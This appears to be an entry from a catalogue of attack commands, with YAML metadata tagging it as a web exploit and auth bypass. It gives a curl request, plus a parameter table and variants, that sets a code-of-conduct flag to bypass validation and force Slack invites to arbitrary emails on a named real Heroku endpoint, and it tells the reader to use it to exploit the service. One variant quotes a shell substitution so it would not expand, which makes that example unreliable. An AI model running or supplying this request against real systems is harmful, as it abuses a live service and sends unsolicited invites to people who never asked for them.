---
data: >-
  curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type:
  application/json" -d '{"coc":1,"email":"example@domain.com"}'
tags:
  - web-exploit
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.613Z'
id: 0501c8a0-b36a-4bae-b117-a42de13db061
verified: false
validated: true
submitted: true
---
# curl-post-invite-with-coc-bypass

## Command

```bash
curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type: application/json" -d '{"coc":1,"email":"example@domain.com"}'
```

## Description

This command sends a tampered POST request to the Gratipay Slack invite endpoint, setting the 'coc' parameter to 1 to bypass validation and force an invite to the specified email. Use it to exploit improper authentication in web invite systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{"coc":1,"email":"example@domain.com"}'` | JSON data with bypass flag and target email | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type: application/json" -d '{"coc":1,"email":"test@example.com"}'
```

### With Response Code Output

```bash
curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type: application/json" -d '{"coc":1,"email":"test@example.com"}' -w "%{http_code}\n" -s -o /dev/null
```

### Advanced Usage

```bash
curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type: application/json" -d '{"coc":1,"email":"$(cat email.txt)"}' -v
```

## Expected Output

HTTP/1.1 400 Bad Request
{"msg":"You have already been invited to Slack. Check for an email from feedback@slack.com."}

Despite the error, an invite email is sent to the email address.

## Related

- [[procedures/Bypass-Invite-Validation-with-coc-Parameter]]
- [[procedures/Force-Send-Slack-Invite-Emails]]
